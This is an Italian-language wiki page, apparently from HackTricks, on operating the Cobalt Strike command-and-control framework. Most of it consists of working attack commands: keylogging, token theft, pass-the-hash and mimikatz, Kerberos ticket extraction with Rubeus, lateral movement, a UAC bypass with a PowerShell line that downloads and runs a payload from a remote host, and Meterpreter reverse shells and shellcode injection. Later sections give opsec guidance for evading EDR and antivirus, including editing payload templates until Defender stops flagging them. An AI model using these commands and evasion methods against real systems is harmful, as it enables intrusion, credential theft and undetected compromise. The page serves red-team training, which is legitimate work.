# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit`, quindi puoi selezionare dove ascoltare, quale tipo di beacon usare (http, dns, smb...) e altro.

### Peer2Peer Listeners

I beacon di questi listener non devono comunicare direttamente con il C2; possono comunicare con esso attraverso altri beacon.

`Cobalt Strike -> Listeners -> Add/Edit`, quindi devi selezionare i beacon TCP o SMB

* Il **TCP beacon imposterà un listener sulla porta selezionata**. Per connetterti a un TCP beacon, usa il comando `connect <ip> <port>` da un altro beacon
* Lo **smb beacon ascolterà su un pipename con il nome selezionato**. Per connetterti a un SMB beacon, devi usare il comando `link [target] [pipe]`.

### Generare e ospitare payload

#### Generare payload nei file

`Attacks -> Packages ->`

* **`HTMLApplication`** per i file HTA
* **`MS Office Macro`** per un documento Office con una macro
* **`Windows Executable`** per un file .exe, .dll o un service .exe
* **`Windows Executable (S)`** per un file .exe, .dll o un service .exe **stageless** (meglio stageless di staged, con meno IoC)

#### Generare e ospitare payload

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Questo genererà uno script/eseguibile per scaricare il beacon da Cobalt Strike in formati come: bitsadmin, exe, powershell e python

#### Ospitare payload

Se hai già il file che vuoi ospitare su un web server, vai a `Attacks -> Web Drive-by -> Host File` e seleziona il file da ospitare e la configurazione del web server.

### Opzioni del Beacon

<details>
<summary>Opzioni e comandi del beacon</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Custom implants / Linux Beacons

- Un custom agent deve solo parlare il protocollo HTTP/S del Cobalt Strike Team Server (profilo C2 malleable predefinito) per registrarsi/fare check-in e ricevere task. Implementa le stesse URI/header/metadata crypto definiti nel profilo per riutilizzare la UI di Cobalt Strike per il tasking e l'output.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Un Aggressor Script (ad esempio `CustomBeacon.cna`) può gestire la generazione dei payload per il beacon non-Windows, consentendo agli operatori di selezionare il listener e produrre payload ELF direttamente dalla GUI.
- Esempi di task handler Linux esposti al Team Server: `sleep`, `cd`, `pwd`, `shell` (esegue comandi arbitrari), `ls`, `upload`, `download` ed `exit`. Questi corrispondono ai task ID attesi dal Team Server e devono essere implementati lato server per restituire l'output nel formato corretto.
- Il supporto BOF su Linux può essere aggiunto caricando i Beacon Object Files in-process con [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (supporta anche BOF in stile Outflank), consentendo l'esecuzione modulare del post-exploitation all'interno del contesto/privilegi dell'implant senza creare nuovi processi.<sup>[[2]](#references)[[3]](#references)</sup>
- Integra un SOCKS handler nel custom beacon per mantenere la stessa capacità di pivoting dei Windows Beacons: quando l'operatore esegue `socks <port>`, l'implant dovrebbe aprire un proxy locale per instradare gli strumenti dell'operatore attraverso l'host Linux compromesso verso le reti interne.

## Opsec

### Execute-Assembly

**`execute-assembly`** usa un **sacrificial process** tramite remote process injection per eseguire il programma indicato. È molto rumoroso, poiché per effettuare l'injection in un processo vengono usate determinate Win API che ogni EDR controlla. Tuttavia, esistono alcuni tool custom che possono essere usati per caricare qualcosa nello stesso processo:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- In Cobalt Strike puoi anche usare BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

L'agressor script `https://github.com/outflanknl/HelpColor` creerà il comando `helpx` in Cobalt Strike, che aggiungerà colori ai comandi indicando se sono BOF (verde), se sono Frok&Run (giallo) e simili, oppure se sono ProcessExecution, injection o simili (rosso). Questo aiuta a capire quali comandi sono più stealthy.

### Act as the user

Puoi controllare eventi come `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 - Controlla tutti gli accessi interattivi per conoscere i normali orari di lavoro.
- System EID 12,13 - Controlla la frequenza di spegnimento/avvio/sospensione.
- Security EID 4624/4625 - Controlla i tentativi NTLM inbound validi/non validi.
- Security EID 4648 - Questo evento viene creato quando vengono usate credenziali in chiaro per effettuare il logon. Se è stato generato da un processo, il binario potrebbe contenere le credenziali in chiaro in un file di configurazione o all'interno del codice.

Quando usi `jump` da Cobalt Strike, è meglio usare il metodo `wmi_msbuild` per fare in modo che il nuovo processo sembri più legittimo.

### Use computer accounts

È comune che i defender controllino i comportamenti anomali generati dagli utenti e **escludano gli account di servizio e gli account computer come `*$` dal monitoraggio**. Potresti usare questi account per eseguire lateral movement o privilege escalation.

### Use stageless payloads

Gli stageless payload sono meno rumorosi di quelli staged perché non devono scaricare una seconda stage dal server C2. Ciò significa che non generano traffico di rete dopo la connessione iniziale, rendendoli meno soggetti al rilevamento da parte delle difese basate sulla rete.

### Tokens & Token Store

Fai attenzione quando rubi o generi token, perché un EDR potrebbe enumerare i token dei thread e rilevare un **token appartenente a un utente diverso** o persino a SYSTEM all'interno del processo.

Questo consente di memorizzare i token **per beacon**, evitando di dover rubare nuovamente lo stesso token. È utile per il lateral movement o quando devi usare più volte un token rubato:

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

Quando ti sposti lateralmente, di solito è meglio **rubare un token invece di generarne uno nuovo** o eseguire un attacco pass the hash.

### Guardrails

Cobalt Strike dispone di una funzionalità chiamata **Guardrails**, che aiuta a impedire l'uso di determinati comandi o azioni che potrebbero essere rilevati dai defender. I Guardrails possono essere configurati per bloccare comandi specifici, come `make_token`, `jump`, `remote-exec` e altri comunemente usati per il lateral movement o la privilege escalation.

Inoltre, il repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) contiene anche alcuni controlli e idee da valutare prima di eseguire un payload.

### Tickets encryption

In un AD fai attenzione alla crittografia dei ticket. Per impostazione predefinita, alcuni tool usano la crittografia RC4 per i ticket Kerberos, che è meno sicura della crittografia AES; per impostazione predefinita, gli ambienti aggiornati usano AES. Questo può essere rilevato dai defender che monitorano gli algoritmi di crittografia deboli.

### Avoid Defaults

Quando usi Cobalt Stricke, per impostazione predefinita le SMB pipe avranno il nome `msagent_####` e `"status_####"`. Cambia questi nomi. È possibile controllare i nomi delle pipe esistenti da Cobal Strike con il comando: `ls \\.\pipe\`

Inoltre, con le sessioni SSH viene creata una pipe chiamata `\\.\pipe\postex_ssh_####`. Modificala con `set ssh_pipename "<new_name>";`.

Anche negli attacchi di post-exploitation le pipe `\\.\pipe\postex_####` possono essere modificate con `set pipename "<new_name>"`.

Nei profili di Cobalt Strike puoi anche modificare elementi come:

- Evitare di usare `rwx`
- Il funzionamento della process injection (quali API verranno usate) nel blocco `process-inject {...}`
- Il funzionamento di "fork and run" nel blocco `post-ex {…}`
- Il tempo di sleep
- La dimensione massima dei binari da caricare in memoria
- Il memory footprint e il contenuto della DLL con il blocco `stage {...}`
- Il traffico di rete

### Bypass memory scanning

Alcuni EDR eseguono la scansione della memoria alla ricerca di firme malware note. Cobalt Strike consente di modificare la funzione `sleep_mask` come BOF, che sarà in grado di crittografare il backdoor in memoria.

### Noisy proc injections

Quando si esegue l'injection di codice in un processo, questa è solitamente molto rumorosa, perché **normalmente nessun processo esegue questa azione e i modi per farlo sono molto limitati**. Pertanto, potrebbe essere rilevata dai sistemi di rilevamento basati sul comportamento. Inoltre, potrebbe essere rilevata dagli EDR che eseguono la scansione della rete alla ricerca di **thread contenenti codice non presente su disco** (anche se processi come i browser, che usano JIT, lo fanno comunemente). Esempio: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

Quando crei un nuovo processo è importante **mantenere una normale relazione parent-child** tra i processi per evitare il rilevamento. Se svchost.exec esegue iexplorer.exe, sembrerà sospetto, poiché svchost.exe non è un parent di iexplorer.exe in un normale ambiente Windows.

Quando viene creato un nuovo beacon in Cobalt Strike, per impostazione predefinita viene creato un processo che usa **`rundll32.exe`** per eseguire il nuovo listener. Questo non è molto stealthy e può essere facilmente rilevato dagli EDR. Inoltre, `rundll32.exe` viene eseguito senza argomenti, rendendolo ancora più sospetto.

Con il seguente comando di Cobalt Strike puoi specificare un processo diverso per creare il nuovo beacon, rendendolo meno rilevabile:
```bash
spawnto x86 svchost.exe
```
Puoi anche modificare questa impostazione **`spawnto_x86` e `spawnto_x64`** in un profile.

### Proxying del traffico dell'attacker

A volte gli attacker devono poter eseguire tool localmente, anche su macchine Linux, e fare in modo che il traffico delle vittime raggiunga il tool (ad esempio, NTLM relay).

Inoltre, a volte, per eseguire un attacco pass-the.hash o pass-the-ticket, è più stealthy per l'attacker **aggiungere questo hash o ticket al proprio processo LSASS** localmente e poi eseguire il pivot da lì, invece di modificare un processo LSASS sulla macchina della vittima.

Tuttavia, devi prestare **attenzione al traffico generato**, poiché potresti inviare traffico non comune (Kerberos?) dal tuo processo backdoor. A questo scopo, potresti eseguire il pivot verso un processo browser (anche se potresti essere scoperto mentre esegui l'injection nel processo, quindi pensa a un modo stealthy per farlo).


### Evitare gli AV

#### AV/AMSI/ETW Bypass

Consulta la pagina:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Solitamente in `/opt/cobaltstrike/artifact-kit` puoi trovare il codice e i template precompilati (in `/src-common`) dei payload che Cobalt Strike utilizzerà per generare i binary beacon.

Utilizzando [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) con la backdoor generata (o semplicemente con il template compilato), puoi individuare cosa fa scattare Defender. Di solito si tratta di una stringa. Pertanto, puoi semplicemente modificare il codice che genera la backdoor in modo che tale stringa non compaia nel binary finale.

Dopo aver modificato il codice, esegui semplicemente `./build.sh` dalla stessa directory e copia la cartella `dist-pipe/` nel client Windows, in `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Non dimenticare di caricare lo script aggressivo `dist-pipe\artifact.cna` per indicare a Cobalt Strike di usare le risorse dal disco che vogliamo, anziché quelle caricate.

#### Kit di risorse

La cartella ResourceKit contiene i template per i payload basati su script di Cobalt Strike, inclusi PowerShell, VBA e HTA.

Usando [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) con i template, puoi scoprire cosa non piace a Defender (AMSI in questo caso) e modificarlo:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Modificando le righe rilevate è possibile generare un template che non verrà rilevato.

Non dimenticare di caricare lo script aggressivo `ResourceKit\resources.cna` per indicare a Cobalt Strike di usare le risorse dal disco che vogliamo, e non quelle caricate.

#### Function hooks | Syscall

Il function hooking è un metodo molto comune utilizzato dagli EDR per rilevare attività dannose. Cobalt Strike consente di bypassare questi hook usando **syscalls** invece delle chiamate standard alle API di Windows con la configurazione **`None`**, oppure di usare la versione **`Nt*`** di una funzione con l'impostazione **`Direct`**, o semplicemente di saltare la funzione **`Nt*`** con l'opzione **`Indirect`** nel malleable profile. A seconda del sistema, un'opzione potrebbe essere più stealth dell'altra.

Questo può essere impostato nel profile o usando il comando **`syscall-method`**

Tuttavia, anche questo potrebbe essere rumoroso.

Un'opzione offerta da Cobalt Strike per bypassare i function hook consiste nel rimuovere tali hook con: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Puoi anche verificare quali funzioni sono sottoposte a hook con [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) o [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Comandi vari di Cobalt Strike</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## References

- [1] [Cobalt Strike Linux Beacon (PoC di implant personalizzato)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader e Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Template nix BOF di Outflank](https://github.com/outflanknl/nix_bof_template)
- [4] [Analisi di Unit42 della crittografia dei metadata di Cobalt Strike](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [Diario SANS ISC sul traffico di Cobalt Strike](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
{{#include ../banners/hacktricks-training.md}}
